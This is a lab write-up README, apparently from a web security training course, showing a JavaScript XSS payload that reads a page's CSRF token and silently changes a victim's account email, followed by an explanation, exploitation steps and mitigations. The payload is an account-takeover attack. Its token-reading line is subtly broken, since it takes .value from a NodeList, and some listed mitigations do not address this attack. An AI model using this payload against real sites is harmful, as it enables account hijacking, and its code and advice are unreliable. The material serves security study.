# Lab: Exploiting XSS to Bypass CSRF Defenses

This README documents the solution and details for exploiting a Cross-Site Scripting (XSS) vulnerability to bypass Cross-Site Request Forgery (CSRF) protections through a malicious script that changes the victim’s email address.

---

## Lab Overview

- The lab features an XSS vulnerability that can be exploited to perform unauthorized actions on behalf of the victim.
- The application employs CSRF defenses such as tokens to protect sensitive actions.
- Despite CSRF protection, XSS can be used to read the CSRF token from the page and send forged requests.

---

## Exploitation Payload

```
<script>
window.addEventListener('DOMContentLoaded', function() {
var token = document.getElementsByName('csrf').value;
var data = new FormData();
data.append('csrf', token);
data.append('email', 'evilhacker@gmail.com');
fetch('/my-account/change-email', {
method: 'POST',
mode: 'no-cors',
body: data
});
});
</script>

```


---

## How the Payload Works

1. **DOMContentLoaded Event Listener**  
   The script waits until the page DOM is fully loaded to ensure CSRF token and form elements are accessible.

2. **CSRF Token Extraction**  
   The script fetches the CSRF token from the hidden input field identified by the `name="csrf"` attribute.

3. **Crafting a Forged Request**  
   Using the valid token, a `POST` request is made to the `/my-account/change-email` endpoint to change the victim’s email to `evilhacker@gmail.com`.

4. **Bypassing CSRF Protections**  
   Since the request includes a valid token obtained from the page itself, the CSRF protections are effectively bypassed.

---

## Steps to Exploit

- Inject or trigger the malicious script in the victim’s browser (e.g., via stored or reflected XSS).
- When the victim loads the affected page, the payload executes and silently changes their email without their knowledge.
- The attacker can then use this to initiate account recovery or other attacks.

---

## Mitigation Strategies

- Fix XSS vulnerabilities to prevent script injection.
- Implement HTTP-only flags on cookies to prevent script access.
- Use SameSite cookie attributes to restrict cross-origin requests.
- Consider more robust CSRF protections such as double-submit cookies or custom headers.
- Employ strict Content Security Policy (CSP).

---


